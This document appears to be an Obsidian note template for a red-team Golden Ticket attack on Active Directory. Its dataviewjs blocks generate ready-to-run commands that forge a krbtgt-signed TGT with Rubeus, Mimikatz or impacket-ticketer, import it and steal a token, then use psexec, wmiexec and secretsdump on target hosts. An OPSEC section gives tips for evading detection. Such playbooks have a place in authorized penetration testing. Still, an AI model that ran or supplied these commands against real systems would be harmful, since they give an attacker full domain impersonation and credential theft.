---
# Attack-specific fields
impersonate_user:
krbtgt_aes256:
krbtgt_ntlm:
golden_ticket:
target_service: cifs
target_host_fqdn:
notes:
---

# Golden Ticket

> [!abstract] Attack Summary
> A **Golden Ticket** is a forged TGT signed with the **krbtgt** account's hash. It allows impersonation of **any user** to **any service** on **any machine** in the domain. The ticket can be created offline and is valid until the krbtgt password changes (which typically never happens automatically).

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",     b?.domain     ?? "—"],
  ["DC FQDN",    b?.dc_fqdn    ?? "—"],
  ["Domain SID", b?.domain_sid ?? "—"],
  ["OS Env",     b?.os_env     ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["User to Impersonate",    `\`INPUT[text(defaultValue("${p.impersonate_user ?? 'administrator'}")):impersonate_user]\``],
  ["krbtgt AES-256 Hash",   `\`INPUT[text:krbtgt_aes256]\``],
  ["krbtgt NTLM Hash (RC4)",`\`INPUT[text:krbtgt_ntlm]\``],
  ["Target Service",        `\`INPUT[text(defaultValue("${p.target_service ?? 'cifs'}")):target_service]\``],
  ["Target Host FQDN",      `\`INPUT[text:target_host_fqdn]\``],
]);
```

> [!info] Prerequisites
> - `krbtgt` AES-256 or NTLM hash (from DCSync)
> - Domain SID (from baseline or `whoami /all`)
> - See [[07 - DCSync]] to obtain the krbtgt hash.

---

## Step 1 — Obtain krbtgt Hash

If not already done, run DCSync to get the krbtgt hash. See [[07 - DCSync]].

Enter hashes above, then continue.

---

## Step 2 — Get Domain SID

**Windows**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
dv.paragraph("```bash\n# From any domain-joined machine\nwhoami /all\n\n# PowerShell\n(Get-ADDomain).DomainSID\n\n# Or from Cobalt Strike\nrun whoami /all\n```");
```

**Linux**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nimpacket-getPac " + domain + "/" + username + ":'" + password + "' -targetUser " + username + " | grep -i 'Domain SID'\n\n# Or via rpcclient\nrpcclient -U '" + username + "%' " + dc_ip + " -c 'lsaquery'\n```");
```

---

## Step 3 — Forge the Golden Ticket

**Windows — Rubeus (Offline)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain     ?? "domain.local";
const sid         = b?.domain_sid ?? "S-1-5-21-REPLACE";
const impersonate = p?.impersonate_user || "administrator";
const aes256      = p?.krbtgt_aes256   || "AES256_HASH";
const ntlm        = p?.krbtgt_ntlm     || "NTLM_HASH";

dv.paragraph("```bash\n# Preferred: AES-256 (less detectable)\nC:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe golden " +
  "/aes256:" + aes256 + " /user:" + impersonate + " /domain:" + domain +
  " /sid:" + sid + " /nowrap\n\n# Alternative: RC4/NTLM\nC:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe golden " +
  "/rc4:" + ntlm + " /user:" + impersonate + " /domain:" + domain +
  " /sid:" + sid + " /nowrap\n```");
```

**Windows — Mimikatz**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain     ?? "domain.local";
const sid         = b?.domain_sid ?? "S-1-5-21-REPLACE";
const impersonate = p?.impersonate_user || "administrator";
const aes256      = p?.krbtgt_aes256   || "AES256_HASH";
dv.paragraph("```bash\nkerberos::golden /user:" + impersonate + " /domain:" + domain + " /sid:" + sid + " /aes256:" + aes256 + " /ticket:golden.kirbi\n```");
```

**Linux — Impacket ticketer**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain     ?? "domain.local";
const sid         = b?.domain_sid ?? "S-1-5-21-REPLACE";
const impersonate = p?.impersonate_user || "administrator";
const aes256      = p?.krbtgt_aes256   || "AES256_HASH";
const ntlm        = p?.krbtgt_ntlm     || "NTLM_HASH";
dv.paragraph("```bash\nimpacket-ticketer -nthash " + ntlm + " -domain " + domain + " -domain-sid " + sid + " " + impersonate + "\n\nexport KRB5CCNAME=" + impersonate + ".ccache\n```");
```

Paste golden ticket: `INPUT[text:golden_ticket]`

---

## Step 4 — Import and Use the Ticket

**Windows — Rubeus createnetonly**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const shortDomain = domain.split('.')[0].toUpperCase();
const impersonate = p?.impersonate_user || "administrator";
const ticket      = p?.golden_ticket    || "BASE64_TICKET";
const targetFqdn  = p?.target_host_fqdn || "dc.domain.local";
const service     = p?.target_service   || "cifs";

dv.paragraph("```bash\n# Import ticket into new logon session\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe createnetonly " +
  "/program:C:\\Windows\\System32\\cmd.exe /domain:" + shortDomain +
  " /username:" + impersonate + " /password:FakePass /ticket:" + ticket + "\n\n# Steal token\nsteal_token PID\n\n# Verify (always use FQDN)\nls \\\\" + targetFqdn + "\\c$\nrun klist\n```");
```

**Linux — Use TGT for services**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const dc_ip       = b?.dc_ip  ?? "DC_IP";
const impersonate = p?.impersonate_user || "administrator";
const targetFqdn  = p?.target_host_fqdn || "dc.domain.local";
dv.paragraph("```bash\nexport KRB5CCNAME=" + impersonate + ".ccache\n\n# Verify ticket\nkin " + impersonate + ".ccache\n\n# Use with psexec\nimpacket-psexec -k -no-pass " + domain + "/" + impersonate + "@" + targetFqdn + "\n\n# Use with wmiexec\nimpacket-wmiexec -k -no-pass " + domain + "/" + impersonate + "@" + targetFqdn + "\n\n# Dump secrets\nimpacket-secretsdump -k -no-pass " + domain + "/" + impersonate + "@" + targetFqdn + "\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - Golden tickets with RC4 encryption (`etype 23`) on modern environments are suspicious — AES-256 blends in better.
> - Tickets with unusual lifetimes (> 10 hours) or RenewUntil > 7 days are suspicious.
> - **Event 4624** (logon) then **4768/4769** from a non-DC is detectable.
> - Mimikatz's `kerberos::golden` creates tickets with suspicious PAC format — Rubeus is stealthier.
> - Consider Diamond Tickets instead for better evasion (see [[10 - Diamond Ticket]]).

---

## Notes & Results

`INPUT[textarea:notes]`
